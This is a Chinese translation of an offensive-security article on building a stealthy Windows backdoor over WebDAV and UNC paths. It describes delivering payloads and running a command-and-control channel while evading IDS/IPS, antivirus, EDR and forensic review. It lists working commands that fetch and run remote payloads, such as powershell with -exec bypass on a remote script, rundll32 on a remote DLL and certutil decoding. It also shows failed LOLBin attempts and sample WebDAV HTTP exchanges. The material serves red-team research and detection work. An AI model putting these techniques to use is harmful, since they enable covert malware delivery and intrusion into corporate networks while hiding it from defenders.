# 【技术分享】利用WebDAV特性建立隐蔽后门

#### 译文声明
本文为翻译文章，原文来源：[arno0x0x.wordpress.com](http://arno0x0x.wordpress.com)。译文仅供参考，具体内容及含义以原文为准。

**译者**：Ska  
**预估稿费**：200 RMB  
**投稿方式**：发送邮件至 linwei#360.cn 或登录网页版在线投稿

## 前言——隐蔽后门的设计与需求
近期，我一直在探索如何在Windows系统中设计一个隐蔽的后门，其主要功能包括：
- 传递各种恶意负载（如shellcode、二进制文件和脚本等）
- 作为C&C（命令与控制）通道

为了成功实现这一目标，攻击者必须克服多个挑战，尤其是在企业环境中：
- **绕过IDS/IPS**
- **绕过各类防护软件（如桌面安全软件、代理服务器、邮件网关等）**
- **具备代理感知能力并支持代理认证**
- **从DFIR（数字取证与事件响应）的角度来看，行为应尽量减少可疑性**

### 隐蔽后门的关键要求
1. 尝试使用被忽视的通信渠道
2. 避免在磁盘上进行操作，或至少避免在无法清除的位置写入信息
3. 尽可能在内存中执行任务
4. 不触发事件数据记录器：
   - MS-Office二进制文件或脚本引擎（如PowerShell、脚本主机）发起HTTP请求是可疑的
   - MS-Office二进制文件或脚本引擎在临时文件夹中写入某些类型的文件也是可疑的

## WebDAV协议的优势
WebDAV协议具有许多有趣的特性，能够满足上述需求：
- **Windows操作系统内置支持该协议**
- **多种内置API函数以及使用这些API的二进制文件和命令行工具都支持UNC（通用命名约定）路径**，这带来了以下优势：
  1. 无需专门实现网络通信部分（不使用常见的网络对象，如Microsoft.XMLHTTP、WinHttp.WinHttpRequest、System.Net.WebClient）
  2. 系统看起来像是在执行正常的网络请求。具体来说，使用的是WebClient服务，因此可以看到连接到WebDAV服务器的svchost.exe进程，而不是powershell.exe、cscript.exe、regsvr32.exe或任何MS-Office二进制文件。
  3. 支持代理感知和代理认证，如果需要，可以使用代理身份验证

## Windows UNC路径处理实验
为了测试WebDAV，我首先使用一个简单的Docker镜像搭建了一个WebDAV服务器：
```bash
docker pull visity/webdav
```

Windows操作系统通过**WebClient服务**支持WebDAV协议。启动此服务后，命令行工具和Windows API函数才能支持指向WebDAV服务器的UNC路径。有趣的是，我发现即使WebClient服务未启动，标准用户（即没有管理员权限的用户）也可以通过`pushd \webdav.server.com`命令映射WebDAV共享上的虚拟驱动器，并自动启动该服务。

一旦WebClient服务启动，我们就可以开始使用一些常用的命令行工具来测试它们是否支持UNC路径指向我们的WebDAV服务器。以下是我同时在Windows 7和Windows 10上进行测试的结果：

### 成功的命令
- `powershell.exe -exec bypass -f \webdav.server.com\payload.ps1`
- `rundll32.exe \webdav.server.com\payload.dll,entryPoint`
- `certutil.exe -decode \webdav.server.com\payload.b64 payload.dll`

### 成功的API调用
- VBA: `Dir("\webdav.server.com\somepath")`
- .Net: `Directory.EnumerateFiles("\webdav.server.com\somepath")`

### 失败的命令
- `regsvr32.exe /s /n /u /i:\webdav.server.com\payload.sct scrobj.dll`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \webdav.server.com\payload.xml`
- `copy \webdav.server.com\payload payload`
- `xcopy \webdav.server.com\payload payload`
- `mshta \webdav.server.com\payload.hta`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:payload.exe \webdav.server.com\payload.cs`

这些失败的命令表明，在某些情况下，操作系统似乎能够通过远程文件系统访问文件（通过WebClient服务和WebDAV协议），但在其他情况下则不行。这背后的原因尚不清楚。

## 优缺点
### 优点
1. **无需实现网络通信部分**：初始Payload可以通过UNC路径直接提供，方便且不易被检测到。
2. **EDR友好**：只有svchost.exe进程执行网络通信。
3. **自动代理感知**：支持代理认证，适用于企业环境。

### 缺点
1. **本地缓存**：通过UNC路径访问/下载的所有有效载荷都会在WebDAV客户端缓存中本地复制（位于`C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV`）。这可能会触发本地防病毒软件。
2. **外围安全系统**：恶意Payload仍可能被IPS或其他外围安全系统阻止，尤其是Web代理防病毒软件。

## WebDAV内部组件 – OPTIONS / PROPFIND / GET
WebDAV是HTTP协议的扩展，使用自己的一组HTTP动词（如PROPFIND、MKCOL、MOVE、LOCK等）和HTTP头（Depth、translate等），并使用XML作为元数据传输的数据格式。

当WebClient服务（即WebDAV客户端）首次连接到WebDAV服务器时，它会通过以下请求询问支持的选项：
```http
OPTIONS / HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.14393
translate: f
Host: 10.211.55.2
```

WebDAV服务器通常会通过以下响应详细说明其实现支持的所有选项：
```http
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Thu, 07 Sep 2017 10:15:36 GMT
Content-Length: 0
DAV: 1
Allow: GET,HEAD,PUT,DELETE,MKCOL,COPY,MOVE,PROPFIND,OPTIONS
Proxy-Connection: Close
Connection: Close
Age: 0
```

随后，WebDAV客户端通常会使用带有“Depth: 0”标题的PROPFIND请求，以获取有关当前位置的信息（目录、大小、创建日期及其他元数据），以及某些默认的Windows文件（如Desktop.ini或Autorun.inf），无论这些文件是否存在于WebDAV服务器上。

通过这种方式，WebDAV协议可以作为一个隐蔽的通道，用于传递恶意负载并保持较低的可疑性。